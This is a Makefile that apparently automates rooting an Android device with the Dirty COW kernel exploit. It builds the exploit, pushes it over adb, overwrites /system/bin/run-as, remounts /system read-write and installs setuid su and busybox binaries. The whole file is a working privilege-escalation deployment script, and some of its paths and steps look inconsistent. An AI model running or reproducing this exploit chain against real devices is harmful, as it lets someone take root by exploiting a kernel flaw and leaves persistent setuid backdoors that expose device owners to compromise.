
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-21 #Minimal Api Level 21 (Android 5.0)

push: build
	adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
	adb push libs/armeabi/run-as /data/local/tmp/run-as
	adb push su /data/local/temp
	adb push busybox /data/local/temp

root: push	#http://androidforums.com/threads/revised-procedure-for-persistent-root.344510/
	adb shell 'chmod 777 /data/local/tmp/run-as'
	adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
	adb shell /system/bin/run-as
	adb shell mount -o remount,rw -t ext3 /dev/mmcblk0p12 /system #Persistent Root Method Start
	adb shell cd /system/bin
	adb shell cat /data/local/temp/su > su
	adb shell cat /data/local/temp/busybox > busybox
	adb shell chmod 4755 su
	adb shell chmod 4755 busybox

clean:
	rm -rf libs
	rm -rf obj
	adb shell rm /data/local/temp/su
	adb shell rm /data/local/temp/busybox
	adb shell rm /data/local/temp/rage
	adb shell reboot
